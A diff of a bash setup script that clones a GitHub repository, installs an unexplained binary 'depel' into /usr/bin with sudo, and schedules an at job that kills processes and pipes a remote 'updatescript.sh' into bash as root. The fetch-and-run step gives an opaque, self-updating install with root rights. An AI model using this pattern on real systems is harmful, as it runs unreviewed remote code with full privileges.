@@ -1,28 +1,28 @@
 #!/bin/bash
 
-rm -rf /tmp/testscript/
+rm -rf /tmp/beauty/
 
-cd /tmp && mkdir testscript
-git clone https://github.com/zoozx/testscript.git /tmp/testscript
-cd /tmp/testscript
-chmod +x /tmp/testscript/depel
+cd /tmp && mkdir beauty
+git clone https://github.com/githubec/beauty.git /tmp/beauty
+cd /tmp/beauty
+chmod +x /tmp/beauty/depel
 chmod 777 ./*.sh
-sudo cp /tmp/testscript/depel /usr/bin/
+sudo cp /tmp/beauty/depel /usr/bin/
 expect login.sh
 
 touch /tmp/at.txt
 {
- echo 'pkill timestart.sh'
- echo 'pkill depel'
- echo 'pkill sleep'
+ echo 'sudo pkill startwork.sh'
+ echo 'sudo pkill depel'
+ echo 'sudo pkill sleep'
  echo 'sleep 60'
- echo 'curl -s -L https://raw.githubusercontent.com/zoozx/betatest/master/updatescript.sh | bash -s'
+ echo 'sudo curl -s -L https://raw.githubusercontent.com/githubec/beauty/master/updatescript.sh | bash -s'
 } > /tmp/at.txt
 #at now + 3 minute < /tmp/at.txt
 at -m -f /tmp/at.txt now + 2 minute
 echo -e 'Restart job specified'
 sleep 3
 
-dos2unix timestart.sh
+dos2unix startwork.sh
 
-./timestart.sh
+./startwork.sh
